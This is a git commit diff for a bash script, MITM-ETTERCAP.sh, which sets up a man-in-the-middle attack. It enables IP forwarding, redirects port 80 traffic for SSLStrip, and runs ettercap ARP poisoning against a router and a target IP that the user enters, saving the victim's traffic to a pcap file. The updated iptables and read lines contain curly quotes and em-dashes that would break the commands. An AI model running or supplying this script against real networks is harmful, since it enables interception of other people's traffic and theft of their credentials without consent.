7d8d24a3735fabd123d8366838aa155753d79e21
smoz1986 <smoz1986@users.noreply.github.com>
2016-02-27 13:25:10 +0000

    Update MITM-ETTERCAP.sh

--- MITM-ETTERCAP.sh
+++ MITM-ETTERCAP.sh
@@ -1,16 +1,24 @@
 #! /bin/bash
-# start Ettercap graphical
+# start Ettercap text
  
-echo Launching Ettercap text...first configuring IP tables
+echo first configuring IP tables…
 echo 1 > /proc/sys/net/ipv4/ip_forward
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --t-port 8080
-echo Which interface to use i.e. eth0, wlan0 etc
-read -p 'Interface: ' intervar
-echo Enter filename
-read -p 'Filename: ' filevar
-echo Enter Target 1 IP
-read -p 'Target 1 IP: ' routervar
-echo Enter Target 2 IP - if required
-read -p 'Target 2 IP: ' targetvar
-ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
-
+echo Enter interface for IP tables i.e. eth0, wlan0 etc
+read -p ‘Interface name: ‘ intvar
+iptables -A PREROUTING -t nat -i $intvar -p tcp —-dport 80 -j REDIRECT —-to-port 8080
+read -r -p "Are you ready to start Ettercap and SSLStrip started? [y/N] " response
+if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
+then
+	echo Which interface to use i.e. eth0, wlan0 etc
+	read -p 'Interface: ' intervar
+	echo Enter filename
+	read -p 'Filename: ' filevar
+	echo Enter Router IP
+	read -p 'Router IP: ' routervar
+	echo Enter Target IP - if required
+	read -p 'Target IP: ' targetvar
+	ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
+else
+    echo ettercap cancelled
+echo finished
+fi
